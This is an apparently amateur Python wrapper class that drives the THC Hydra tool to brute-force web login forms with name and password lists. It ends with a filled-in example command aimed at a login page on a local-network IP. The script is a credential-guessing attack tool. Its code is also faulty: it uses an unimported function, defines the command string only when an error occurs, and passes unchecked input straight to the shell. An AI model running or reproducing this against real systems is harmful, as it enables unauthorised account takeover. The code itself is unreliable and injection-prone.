# coding: utf-8

import os
import subprocess

class THC_hydra(object):
    _name = 'hydra'
    _parameters = ['-l','-L','-p','-P','-C','-M','-o','-f','-t','-w','-v', '-s']

    _target = {
        'host':'',
        'porta_web':'',
        'list_name':[],
        'list_password':[],
        'protocolo':'',
        'local_page_login':'',
        'request':'',
        'message':'',
        }

    def __init__(self):
        pass

    def target(self, host, port, list_name, list_password, protocolo, local_page_login, request, message):
        self._target['porta_web'] = port
        self._target['list_name'] = list_name
        self._target['list_password'] = list_password
        self._target['host'] = host
        self._target['protocolo'] = protocolo
        self._target['local_page_login'] = local_page_login
        self._target['request'] = request
        self._target['message'] = message





    def atack_web(self):
        data = f"{self._target['local_page_login']}: {self._target['request']}:{self._target['message']}"
        print(data)
        try:
            subprocess.call('hydra')
        except:
            print(colored('Hydra não instalado!', 'red'))
            arg = f" hydra {self._parameters[11]} {self._target['porta_web']} {self._parameters[1]} {self._target['list_name']} {self._parameters[3]} {self._target['list_password']} {self._target['host']} {self._target['protocolo']} {data} "
        print(arg)
        os.system(arg)

'''

 hydra
 -s 80
 -L /home/aisten/Documents/area01/lista_de_nomes/lista01.txt
 -P /home/aisten/utilitary/senha.txt
 192.168.2.61
 http-post-form
 "/doc/page/login.asp: username=^USER^&password=^PASS^&login:Login failed"

 '''